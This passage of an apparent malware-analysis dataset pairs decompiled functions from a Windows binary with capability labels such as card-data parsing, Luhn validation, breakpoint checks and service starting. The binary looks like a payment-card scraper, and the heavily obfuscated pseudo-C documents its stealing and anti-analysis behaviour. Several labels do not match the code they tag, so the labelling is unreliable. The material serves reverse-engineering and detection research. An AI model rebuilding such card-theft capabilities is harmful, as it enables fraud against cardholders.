+ 0xc) = *(extraout_EDX + 0xc) + -0x68;\n        *(arg_14h + 0x40) = *(arg_14h + 0x40) ^ extraout_EDX >> 8;\n        *(extraout_EDX + 10) = *(extraout_EDX + 10) + extraout_CH_00;\n        fcn.00403eb0(0x407490, 0x407490, arg_10h_00, arg_14h_00);\n        uVar18 = 0xb;\n        uVar19 = 0;\n        uVar20 = 0;\n        uVar15 = 0x3c;\n        uVar16 = 0x4073;\n        uVar17 = 0;\n        uVar10 = 10;\n        uVar12 = 0;\n        uVar14 = 0;\n    }\n    else {\n        arg_14h = arg_14h + 1;\n        if (!bVar8 && arg_14h != 0) {\n            in_AF = 9 < (uVar11 & 0xf) | in_AF;\n            piVar5 = (uVar11 & 0xffff0000 | CONCAT11((uVar11 >> 8) + in_AF, uVar11 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar5 = *piVar5 - arg_14h;\n            goto code_r0x00403511;\n        }\n        if (!bVar8) {\n            pcVar6 = iVar7 + 10;\n            *pcVar6 = *pcVar6 + extraout_CH;\n            goto code_r0x0040355b;\n        }\n        pcVar6 = iVar7 + 10;\n        *pcVar6 = *pcVar6 + extraout_CH;\n    }\n    fcn.00403eb0(0x407490, CONCAT13(uVar14, CONCAT21(uVar12, uVar10)), CONCAT13(uVar17, CONCAT21(uVar16, uVar15)), \n                 CONCAT13(uVar20, CONCAT21(uVar19, uVar18)));\n    fcn.00403eb0(0x407490, 10, 0x407348, 4);\n    uVar1 = fcn.00403eb0(0x407490, 10, 0x40734c, 4);\n    bVar8 = false;\n    uVar10 = ((uVar1 & 0xff | ((uVar1 >> 8) - arg_14h) + 0x4d << 8) & 0x26ae) == 1;\n    uVar2 = fcn.00403eb0(0x407490, 10, 0x407350, 0xc);\n    if ((!bVar8) && (bVar8)) {\n        out(0xbd, uVar2);\n        return;\n    }\n    uVar3 = fcn.00403eb0(0x407490, 10, 0x40735c, 4);\n    if ((!uVar10) && (uVar10)) {\n        arg_14h = arg_14h + 1;\n        if (bVar8 || arg_14h == 0) goto code_r0x004036a7;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar5 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar5 = *piVar5 - arg_14h;\n    }\n    uVar11 = fcn.00403eb0(0x407490, 10, 0x407360, 9);\n    piVar5 = uVar11 >> 0x20;\n    *(uVar11 + -0x7ce92414) = extraout_ST0_00;\n    *piVar5 = *piVar5 + 0x166adf84;\n    fcn.00403eb0(0x407490, 10, 0x40736c, arg_14h);\ncode_r0x004036a7:\n    fcn.00403eb0(0x407490, 10, 0x407384, 7);\n    return;\n}\n",
        "token_count": 2580
    },
    "004036d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038c5) overlaps instruction at (ram,0x004038c4)\n// \n\nvoid fcn.004036d0(void)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    uint8_t extraout_AH;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar4;\n    char extraout_DL;\n    char extraout_DH;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    uint unaff_EBP;\n    uint32_t *unaff_ESI;\n    uint32_t *unaff_EDI;\n    bool bVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    uint64_t uVar10;\n    uint32_t unaff_retaddr;\n    uint32_t *arg_ch;\n    int32_t iVar11;\n    uint32_t *puVar12;\n    \n    fcn.00403eb0(0x407490, 10, 0x40738c, 0x20);\n    fcn.00403eb0(0x407490, 10, 0x4073ac, 0x26);\n    arg_ch = unaff_ESI;\n    fcn.00403eb0(0x407490, 10, 0x4073d4, 8);\n    cVar9 = SBORROW2(unaff_EDI, 1);\n    cVar8 = unaff_EDI + -1 < 0;\n    puVar12 = 0x4073dc;\n    uVar10 = fcn.00403eb0(0x407490, 10, 0x4073dc, 0x19);\n    iVar5 = uVar10 >> 0x20;\n    if ((cVar9 == cVar8) && (cVar9 != cVar8)) {\n        iVar4 = extraout_ECX;\n        iVar5 = uVar10;\n        iVar11 = unaff_EBX;\n        if (uVar10 < 0xf8680b6a00000000) goto code_r0x0040378b;\ncode_r0x004037cb:\n        uVar3 = uVar10 >> 0x20;\n        iVar5 = uVar10;\n        iVar11 = unaff_EBX;\n        if (uVar3 != 0x1868126a) goto code_r0x004037d3;\n        *(iVar4 + 0x57) = *(iVar4 + 0x57) + uVar10 + (uVar3 < 0x1868126a);\n    }\n    else {\n        iVar11 = 0xb;\n        unaff_EBP = 0x4073f8;\n        arg_ch = 0xa;\ncode_r0x0040378b:\n        *(iVar5 + 10) = *(iVar5 + 10) + (extraout_ECX >> 8);\n        iVar2 = fcn.00403eb0(0x407490, arg_ch, unaff_EBP, iVar11);\n        cVar9 = '\\0';\n        cVar8 = (iVar2 + unaff_EBX | 0x11a9U) < 0;\n        puVar12 = 0x407404;\n        uVar10 = fcn.00403eb0(0x407490, 10, 0x407404, 0x12);\n        iVar5 = uVar10 >> 0x20;\n        iVar4 = extraout_ECX_00;\n        if ((cVar9 == cVar8) && (cVar9 != cVar8)) goto code_r0x004037cb;\n        iVar11 = 0x12;\n        unaff_EBP = 0x407418;\n        arg_ch = 0xa;\ncode_r0x004037d3:\n        *(iVar5 + 10) = *(iVar5 + 10) + (iVar4 >> 8);\n        fcn.00403eb0(0x407490, arg_ch, unaff_EBP, iVar11);\n        fcn.00403eb0(0x407490, 10, 0x40742c, 2);\n        puVar12 = unaff_EDI;\n    }\n    fcn.00403eb0(0x407490, 10, 0x407430, 8);\n    bVar6 = extraout_DL + 0x15U < extraout_AH;\n    bVar7 = extraout_DL + 0x15U == extraout_AH;\n    uVar3 = fcn.00403eb0(0x407490, 10, 0x407438, 8);\n    if ((!bVar7) && (bVar7)) {\n        if (bVar6 || unaff_EBX + 1 == 0) {\n            *unaff_ESI = *unaff_ESI | 0x61000000;\n            goto code_r0x004038cb;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    fcn.00403eb0(0x407490, 10, 0x407440, 6);\n    bVar6 = SBORROW1(extraout_DH, '6');\n    puVar12 = 0x407490;\n    uVar3 = unaff_retaddr;\n    fcn.00403eb0(0x407490, 10, 0x407448, 7);\n    if ((bVar6) || (!bVar6)) {\n        fcn.00403eb0(0x407490, 10, 0x407450, 7);\n        fcn.00403eb0(0x407490, 10, 0x407458, 6);\n        fcn.00403eb0(0x407490, 10, 0x407460, 0x25);\n        fcn.00403eb0(0x407490, 10, 0x407488, 8);\n        return;\n    }\ncode_r0x004038cb:\n    *puVar12 = uVar3;\n    return;\n}\n",
        "token_count": 1444
    },
    "00403da0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint fcn.00403da0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x42472c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407114);\n    *0x424730 = (*pcVar1)(iVar2, 0x407130);\n    *0x424734 = (*pcVar1)(iVar2, 0x407140);\n    if (((*0x42472c != 0) && (*0x424730 != 0)) && (*0x424734 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "00403e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403e50(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004041c0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x40749c;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00404580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404580(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401930();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00404db0();\n        arg_ch_01 = fcn.00404db0();\n        arg_ch_02 = fcn.00404db0();\n        fcn.00403a00(arg_10h, arg_ch_00);\n        fcn.00403a00(arg_8h, arg_ch_01);\n        fcn.00403a00(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404260(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404260(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404260(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403a00(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 612
    },
    "004046f0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404811) overlaps instruction at (ram,0x00404810)\n// \n// WARNING: Removing unreachable block (ram,0x00404811)\n// WARNING: Removing unreachable block (ram,0x00404803)\n// WARNING: Removing unreachable block (ram,0x0040480d)\n// WARNING: Removing unreachable block (ram,0x00404735)\n// WARNING: Removing unreachable block (ram,0x004048ce)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __fastcall fcn.004046f0(int32_t param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint16_t uVar5;\n    uint8_t uVar7;\n    int32_t unaff_EBX;\n    uint32_t uVar6;\n    uchar *puVar8;\n    uint8_t **unaff_EDI;\n    uint8_t **ppuVar9;\n    bool in_CF;\n    bool bVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    float10 in_ST0;\n    \n    puVar8 = &stack0xfffffffc;\n    uVar6 = unaff_EBX + 1;\n    bVar10 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n    *param_3 = 0x15;\n    if ((!in_CF && uVar6 != 0) && (in_CF || uVar6 == 0)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    param_3[1] = 0xd4;\n    ppuVar9 = unaff_EDI;\n    if ((SCARRY4(unaff_EBX, 1) == uVar6 < 0) && (SCARRY4(unaff_EBX, 1) != uVar6 < 0)) {\n        out(0xc4, param_3);\n        param_2 = param_2 & 0xffffff00 | param_2 ^ param_1;\n        ppuVar9 = unaff_EDI + 1;\n        *unaff_EDI = param_3;\n        uVar7 = unaff_EBX >> 8;\n        in_CF = uVar7 < *param_3;\n        bVar10 = (POPCOUNT(uVar7 - *param_3) & 1U) == 0;\n    }\n    param_3[2] = 0xbe;\n    uVar7 = param_3;\n    if ((!in_CF) && (in_CF)) {\n        cVar2 = uVar7 - *ppuVar9;\n        func_0x1018a6c2((in_NT & 1) * 0x4000 | SBORROW1(uVar7, *ppuVar9) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar2) & 1U) == 0) * 4 | uVar7 < *ppuVar9);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    param_3[3] = 0xfd;\n    if ((bVar10) || (!bVar10)) {\n        param_3[4] = 0xfa;\n        puVar3 = param_3;\n    }\n    else {\n        puVar3 = param_3 & 0xffffff00 | uVar7 - 6;\n    }\n    param_3[5] = 0xc6;\n    param_3[6] = 0x47;\n    uVar5 = param_2 - 1U & param_1;\n    bVar10 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n    param_3[7] = 0x8a;\n    if (((bVar10) && (!bVar10)) || (param_3[8] = 0x1d,  puVar4 = puVar3,  uVar5 != 0)) {\n        puVar8 = *0xc617b43a;\n        param_3 = 0x34a96cf5;\n        *0x5e560876 = *0x5e560876 | unaff_EBX;\n        puVar4 = param_2 + 1;\n        param_2 = puVar3;\n        if (*0x5e560876 == 0) goto code_r0x004047d9;\n    }\n    param_3[9] = 0x3f;\n    param_3[10] = 0x77;\n    param_3[0xb] = 0x6c;\n    param_3[0xc] = 0x67;\n    cVar2 = param_2 + -0x51;\n    bVar11 = cVar2 < '\\0';\n    bVar10 = (POPCOUNT(cVar2) & 1U) != 0;\n    param_3[0xd] = 0xd5;\n    puVar3 = param_3;\n    if ((bVar10) && (!bVar10)) {\n        puVar3 = *ppuVar9;\n        *ppuVar9 = param_3;\n        puVar8 = puVar8 + -*(puVar8 + 0x5f9dff63);\n        if (puVar8 < 0) {\ncode_r0x004047d9:\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        bVar11 = puVar3 < 0;\n        if (!bVar11) {\n            puVar8[-0x68] = puVar4;\n            for (; param_1 != 0; param_1 = param_1 + -1) {\n                *ppuVar9 = puVar4;\n                ppuVar9 = ppuVar9 + 1;\n            }\n            *ppuVar9 = puVar4;\n            *(ppuVar9 + 2) = puVar4;\n            fcn.004046f0(puVar8 + -0x68);\n            fcn.00404b50(puVar8 + -0x68, *(puVar8 + -4), 0x4074a0, 0xa260);\n            puVar1 = *(puVar8 + 0xc);\n            **(puVar8 + 8) = 0x4074a0;\n            *puVar1 = 0xa260;\n            return;\n        }\n    }\n    puVar3[0xe] = 0x9c;\n    if ((!bVar11) && (bVar11)) {\n        *(ppuVar9 + 7) = in_ST0;\n        puVar3 = puVar3 + 5;\n    }\n    puVar3[0xf] = 0x84;\n    **(puVar8 + 0xc) = 0x10;\n    return;\n}\n",
        "token_count": 1652
    },
    "00404aa0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404aa0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 243
    },
    "00404bd0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404ce9) overlaps instruction at (ram,0x00404ce5)\n// \n// WARNING: Removing unreachable block (ram,0x00404c84)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404bd0(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint32_t in_EAX;\n    uint32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint16_t unaff_BX;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uint32_t unaff_EDI;\n    bool bVar8;\n    bool bVar9;\n    uint uStack28;\n    uint uStack24;\n    uint32_t uVar10;\n    \n    puVar5 = &stack0xfffffffc;\n    *arg_8h = 0x19;\n    uVar2 = in_EAX & 0xffff;\n    uVar3 = uVar2;\n    arg_8h[1] = 0xc;\n    arg_8h[2] = 0xbf;\n    arg_8h[3] = 0xb2;\n    uVar4 = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - unaff_BX, in_ECX);\n    bVar9 = SBORROW4(uVar4, in_EDX);\n    bVar8 = uVar4 == in_EDX;\n    arg_8h[4] = 0xa4;\n    if ((in_EDX <= uVar4) && (in_EDX > uVar4)) {\n        uStack24 = 0x404c5a;\n        func_0x1018abd2();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    arg_8h[5] = 0x9d;\n    uVar10 = uVar2;\n    if ((in_EDX <= uVar4) && (uVar10 = unaff_EDI,  uVar4 < in_EDX)) {\n        *(unaff_EDI | &stack0xfffffffc) = uVar2;\n        bVar9 = false;\n        uVar3 = uVar2 + (uVar2 >> 8) * 'y';\n        bVar8 = uVar3 == 0;\n    }\n    arg_8h[6] = 0xb6;\n    if (((!bVar8) && (arg_8h = (arg_8h >> 8 & 0xffff00) << 8 | arg_8h & 0xffff,  bVar8)) || (arg_8h[7] = 10,  !bVar9)) {\n        bVar8 = SBORROW1(*0x66000000, 'Q');\n        *0x66000000 = *0x66000000 + -0x51;\n        arg_8h = arg_8h & 0xffff0000 | uVar10 & 0xffff;\n        if (bVar8 != false) {\n            LOCK();\n            uVar3 = uVar3 + 0x517f;\n        }\n    }\n    arg_8h[8] = 0x21;\n    uVar3 = uVar3 ^ unaff_BX;\n    arg_8h[9] = 0xd3;\n    puVar7 = &stack0xfffffffc;\n    if ((uVar3 != 0) && (puVar7 = &stack0xfffffffc,  uVar3 == 0)) {\n        puVar6 = &stack0xffffffe8;\n        puVar7 = &stack0xffffffe8;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    arg_8h[10] = 0x4a;\n    if ((uVar3 < 1) || (0 < uVar3)) {\n        arg_8h[0xb] = 0xf1;\n    }\n    arg_8h[0xc] = 0xc5;\n    **(puVar7 + 0xc) = 0xd;\n    return;\n}\n",
        "token_count": 1010
    },
    "00401000": {
        "rules": [
            "create or open file",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401059) overlaps instruction at (ram,0x00401058)\n// \n\nuint __cdecl fcn.00401000(uint filename, uint mode, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint8_t *unaff_EBX;\n    uint8_t in_AF;\n    bool bVar5;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    // [00] -r-x section size 20480 named .text\n    puVar3 = (*_sym.imp.MSVCRT.dll_fopen)(filename);\n    if (puVar3 != NULL) {\n        cVar2 = arg_10h - *puVar3;\n        uVar4 = func_0x10186faa((in_NT & 1) * 0x4000 | SBORROW1(arg_10h, *puVar3) * 0x800 | (in_IF & 1) * 0x200 |\n                                (in_TF & 1) * 0x100 | (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 |\n                                (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4 | arg_10h < *puVar3 |\n                                (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                (in_AC & 1) * 0x40000, arg_14h, puVar3);\n        puVar1 = puVar3 + 0x53;\n        *puVar1 = *puVar1 + extraout_DL;\n        bVar5 = *puVar1 < '\\0';\n        (*_sym.imp.MSVCRT.dll_fwrite)(uVar4, 1);\n        if ((bVar5) || (!bVar5)) {\n            (*_sym.imp.MSVCRT.dll_fflush)(puVar3 + 1);\n        }\n        else {\n            *unaff_EBX = *unaff_EBX & 0xc3;\n        }\n        (*_sym.imp.MSVCRT.dll_fclose)(puVar3 + 1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 601
    },
    "004013e0": {
        "rules": [
            "create or open file",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013f1) overlaps instruction at (ram,0x004013f0)\n// \n\nvoid __cdecl fcn.004013e0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    char *pcVar1;\n    char cVar2;\n    uint in_ECX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool in_OF;\n    \n    cVar2 = in_ECX >> 8;\n    if (!in_OF) {\n        if (in_OF) goto code_r0x004013ee;\n    }\n    in_EAX = arg_8h;\ncode_r0x004013ee:\n    pcVar1 = in_EAX + 1;\n    *unaff_EDI = *unaff_ESI;\n    *(in_EAX + -0x7f) = *(in_EAX + -0x7f) + cVar2;\n    *pcVar1 = *pcVar1 + pcVar1;\n    *0x6a08458e = *0x6a08458e + cVar2;\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(pcVar1, 0xc0000000, 1, 0);\n    return;\n}\n",
        "token_count": 279
    },
    "004010a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010ec) overlaps instruction at (ram,0x004010e6)\n// \n\nchar * __cdecl fcn.004010a0(char *arg_8h, char *arg_ch, uint arg_10h, char *arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    char *pcVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    char *pcStack48;\n    uchar *puStack40;\n    \n    bVar6 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar3 = arg_ch + (arg_8h - arg_14h);\n    if ((pcVar3 == NULL || bVar6 != pcVar3 < 0) || (pcVar3 != NULL && bVar6 == pcVar3 < 0)) {\n        if (arg_14h == NULL) {\n            return arg_8h;\n        }\n        if ((POPCOUNT(arg_14h & 0xff) & 1U) != 0) goto code_r0x004010c4;\n    }\n    else {\ncode_r0x004010c4:\n        arg_8h[-0x7ac625aa] = arg_8h[-0x7ac625aa] ^ pcVar3;\n        pcVar5 = pcVar3 + (unaff_EBX + 1) * 2 + 0x7a;\n        uVar1 = pcVar3 & 0x1f;\n        cVar2 = *pcVar5;\n        *pcVar5 = *pcVar5 << uVar1;\n        arg_8h = arg_8h + ((pcVar3 & 0x1f) != 0 && cVar2 << uVar1 - 1 < '\\0') + 0x5e665666;\n        if ((POPCOUNT(arg_8h & 0xff) & 1U) == 0) {\n            out(*unaff_ESI, arg_14h);\n            do {\n                cVar2 = arg_8h >> 8;\n                in_AF = 9 < (arg_8h & 0xf) | in_AF;\n                arg_8h = CONCAT31(CONCAT21(arg_8h >> 0x10, cVar2 - in_AF), -in_AF);\n            } while (in_AF || cVar2 == *arg_14h);\n            goto code_r0x004010df;\n        }\n    }\n    in_AF = arg_8h < pcVar3;\n    pcStack48 = arg_ch;\n    puStack40 = &stack0xfffffffc;\n    if (pcVar3 < arg_8h) {\n        return NULL;\n    }\ncode_r0x004010df:\n    do {\n        *(arg_ch + arg_14h * 2) = (*(arg_ch + arg_14h * 2) + 0x7b) - in_AF;\n        *(pcVar3 + 0x3b) = arg_8h;\n        *(pcVar3 + 0x39770845) = *(pcVar3 + 0x39770845);\n        arg_8h = *(puStack40 + 8);\n        arg_14h = *(puStack40 + 0x10);\n        if (*arg_8h == *arg_14h) {\n            iVar4 = *(puStack40 + 0x14);\n            pcVar3 = arg_14h + 1;\n            arg_14h = NULL;\n            bVar6 = true;\n            pcVar5 = arg_8h;\n            do {\n                pcVar5 = pcVar5 + 1;\n                iVar4 = iVar4 + -1;\n                pcStack48 = pcVar3;\n                if (iVar4 == 0) break;\n                pcStack48 = pcVar3 + 1;\n                bVar6 = *pcVar5 == *pcVar3;\n                pcVar3 = pcStack48;\n            } while (bVar6);\n            if (bVar6) {\n                return arg_8h;\n            }\n        }\n        pcVar3 = *(puStack40 + 0xc);\n        arg_8h = arg_8h + 1;\n        in_AF = arg_8h < pcVar3;\n        *(puStack40 + 8) = arg_8h;\n        arg_ch = pcStack48;\n        if (pcVar3 < arg_8h) {\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 1019
    },
    "004016e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401732) overlaps instruction at (ram,0x00401731)\n// \n\nuint fcn.004016e0(uint *param_1, uint *param_2)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    ulong uVar6;\n    \n    puVar3 = param_2;\n    puVar2 = param_1;\n    uVar6 = fcn.00401b10(param_1, param_2, &param_1, &param_2);\n    if (uVar6 == 0) {\n        return 0;\n    }\n    uVar4 = uVar6 >> 0x20;\n    bVar5 = SBORROW2((CONCAT11((uVar6 >> 8) + -0x2b, uVar6) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar6 >> 0x28 | uVar4, uVar4), \n                     0x4001);\n    *(uVar6 + 0x58) = param_2;\n    if ((bVar5) || (!bVar5)) {\n        uVar6 = CONCAT44(&param_1, &param_2);\n    }\n    *puVar2 = *puVar3;\n    puVar1 = uVar6 + 0x52;\n    *puVar1 = *puVar1 | 0x8d;\n    fcn.00401b10(puVar2 + 1, puVar3 + 1, uVar6 >> 0x20, uVar6);\n    return 1;\n}\n",
        "token_count": 381
    },
    "00401750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040175d) overlaps instruction at (ram,0x0040175c)\n// \n\nvoid __fastcall fcn.00401750(uint param_1, uint8_t *param_2)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uchar *unaff_EBP;\n    uchar **ppuVar7;\n    int32_t iVar8;\n    uchar *unaff_EDI;\n    bool bVar9;\n    bool bVar10;\n    bool bVar11;\n    int32_t in_stack_00000010;\n    uchar *puStack4;\n    \ncode_r0x00401750:\n    ppuVar7 = &puStack4;\n    puStack4 = unaff_EBP;\n    puStack4 = in_stack_00000010 * 2;\n    bVar9 = false;\n    bVar11 = false;\n    bVar10 = in_stack_00000010 == 0;\n    if (in_stack_00000010 < 1) {\n        return;\n    }\n    iVar8 = 1;\n    puVar4 = unaff_EDI;\n    do {\n        if ((bVar11) || (!bVar11)) {\n            param_2 = *(ppuVar7 + 0x10);\n            iVar3 = *(ppuVar7 + -8);\n            unaff_EDI = puVar4;\ncode_r0x004017a8:\n            uVar6 = param_2[iVar3];\n            uVar5 = puStack4 >> 8 & iVar3 ^ 6;\n            uVar2 = *(iVar8 % *(ppuVar7 + 0xc) + *(ppuVar7 + 8));\n            param_2 = iVar8 % *(ppuVar7 + 0xc) & 0xffffff00U | uVar2;\n            *(ppuVar7 + -2) = 